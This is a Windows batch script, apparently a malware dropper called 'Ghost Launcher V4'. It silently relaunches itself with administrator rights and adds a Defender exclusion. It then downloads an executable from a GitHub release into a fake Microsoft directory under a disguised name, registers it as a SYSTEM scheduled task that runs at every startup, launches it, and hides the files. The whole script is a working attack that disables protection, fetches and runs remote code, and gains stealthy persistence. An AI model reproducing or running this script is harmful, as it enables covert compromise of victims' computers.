@echo off
:: --- THE GHOST LAUNCHER V4 ---
if "%~1"=="-hidden" goto :payload

powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '-hidden' -WindowStyle Hidden -Verb RunAs"
exit /b

:payload
set "TARGET_DIR=C:\ProgramData\Microsoft\Framework"
set "TARGET_FILE=%TARGET_DIR%\MsHostStorage.exe"
set "URL=https://github.com/Putin6969/leach/releases/download/1.3/RATIONAL_FOOD.exe"
set "TASK_NAME=Microsoft\Windows\Management\Provisioning\SystemCheck"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1

:: 1. Security Exclusion
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'" >nul 2>&1
timeout /t 2 /nobreak >nul

:: 2. Download
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TARGET_FILE%' -UseBasicParsing" >nul 2>&1

:: 3. Create Task (Original Method - Guaranteed to create)
schtasks /create /tn "%TASK_NAME%" /tr "\"%TARGET_FILE%\"" /sc onstart /rl highest /ru "SYSTEM" /f >nul 2>&1

:: 4. Patch Settings (The "Queued" Fix)
:: This flips the battery and idle flags on the task we just created.
powershell -Command "$s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; Set-ScheduledTask -TaskName '%TASK_NAME%' -Settings $s" >nul 2>&1

:: 5. Immediate Launch
schtasks /run /tn "%TASK_NAME%" >nul 2>&1

:: 6. Stealth
attrib +s +h "%TARGET_DIR%" >nul 2>&1
attrib +s +h "%TARGET_FILE%" >nul 2>&1

exit
